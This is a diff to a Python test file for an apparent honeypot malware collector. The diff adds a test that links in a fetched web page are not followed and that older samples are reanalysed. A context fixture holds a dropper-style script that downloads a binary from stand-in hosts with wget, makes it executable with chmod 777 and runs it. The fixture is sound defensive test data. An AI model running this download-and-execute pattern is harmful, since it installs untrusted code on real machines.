@@ -26,6 +26,7 @@ from sqlalchemy.ext.asyncio import (
     async_sessionmaker,
     create_async_engine,
 )
+from suckerpot_analysis import ANALYSIS_VERSION
 from suckerpot_db import create_session_factory, database_url_from_env
 from suckerpot_db.roles import apply_roles
 
@@ -62,6 +63,13 @@ SCRIPT = (
     b"wget http://dl.example.test/bins/x.arm7 -O x\n"
     b"wget http://198.51.100.9/ignored.sh\n"
     b"chmod 777 x; ./x\n"
+)
+
+
+PAGE = (
+    b'<!doctype html><html><head><title>t</title><link rel="stylesheet" '
+    b'href="http://dl.example.test/site.css"></head><body>'
+    b'<a href="http://dl.example.test/bins/x.arm7">download</a></body></html>'
 )
 
 
@@ -276,6 +284,45 @@ async def test_depth_cap_stops_the_chain(
     assert targets[0].n == 1
     link = await rows(owner, "SELECT target_id FROM sample_links WHERE kind = 'next_url'")
     assert link and all(r.target_id is None for r in link)
+
+
+async def test_links_in_a_web_page_are_not_followed(
+    owner: AsyncEngine, factories: Any, tmp_path: Path
+) -> None:
+    coll_f, ana_f = factories
+    s = settings(tmp_path)
+    store = Quarantine(s.quarantine_dir)
+    store.prepare()
+    proxy = FakeProxy(handler_for({f"{HOST}/index.html": Reply(body=PAGE)}))
+    await add_indicator(owner, f"{HOST}/index.html")
+    async with proxy.running():
+        gate = await open_gate(proxy.url)
+        svc = CollectorService(s, coll_f, store, gate, clock=Clock())
+        analyzer = AnalyzerService(s, ana_f, store)
+        assert len(await svc.step()) == 1
+        assert await analyzer.step() == 1
+        sample = (await rows(owner, "SELECT * FROM samples"))[0]
+        assert (sample.kind, sample.severity, sample.family) == ("html", "info", None)
+        assert sample.analysis_status == "done"
+        assert (await rows(owner, "SELECT count(*) AS n FROM fetch_targets"))[0].n == 1
+        assert (await rows(owner, "SELECT count(*) AS n FROM sample_links"))[0].n == 0
+        hashes = await rows(owner, "SELECT count(*) AS n FROM indicators WHERE type = 'hash'")
+        assert hashes[0].n == 0  # a page is not threat intelligence
+        assert [u for u, _ in proxy.seen] == [f"{HOST}/index.html"]
+
+        # A sample analysed by an older version is classified again on its own, with no manual step.
+        async with owner.begin() as conn:
+            await conn.execute(
+                text("UPDATE samples SET kind = 'text', severity = 'notice', analysis_version = 1")
+            )
+        assert await analyzer.step() == 1
+        again = (await rows(owner, "SELECT kind, severity, analysis_version FROM samples"))[0]
+        assert (again.kind, again.severity, again.analysis_version) == (
+            "html",
+            "info",
+            ANALYSIS_VERSION,
+        )
+        assert await analyzer.step() == 0
 
 
 async def test_closed_gate_spends_nothing(
